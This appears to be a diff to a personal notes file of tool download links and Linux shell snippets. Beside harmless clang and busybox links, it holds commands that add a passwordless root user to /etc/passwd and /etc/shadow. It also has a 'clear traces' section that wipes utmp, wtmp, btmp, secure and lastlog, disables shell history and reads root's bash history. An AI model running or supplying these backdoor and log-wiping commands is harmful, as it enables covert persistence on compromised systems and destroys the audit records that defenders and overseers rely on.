@@ -421,7 +421,11 @@ https://docs.microsoft.com/en-us/sysinternals/downloads/
 
 https://bellard.org/tcc/
 
-http://prereleases.llvm.org/win-snapshots/clang-format-r323406.exe
+https://releases.llvm.org/6.0.0/LLVM-6.0.0-win64.exe
+----
+clang.exe --target=x86_64-w64-windows-gnu 123.c
+
+http://prereleases.llvm.org/win-snapshots/clang-format-r325576.exe
 
 https://frippery.org/files/busybox/busybox64.exe
 
@@ -954,11 +958,12 @@ echo "sqnuid:x:0:0::/:/bin/bash" >> /etc/passwd
 echo "sqnuid::::::::" >> /etc/shadow
 
 Linux 清空痕迹：
+cat /root/.bash_history
+who
 unset HISTFILE
 echo > /var/run/utmp
 echo > /var/log/wtmp
 echo > /var/log/btmp
 echo > /var/log/secure
 echo > /var/log/lastlog
-echo > /root/.bash_history
 ```
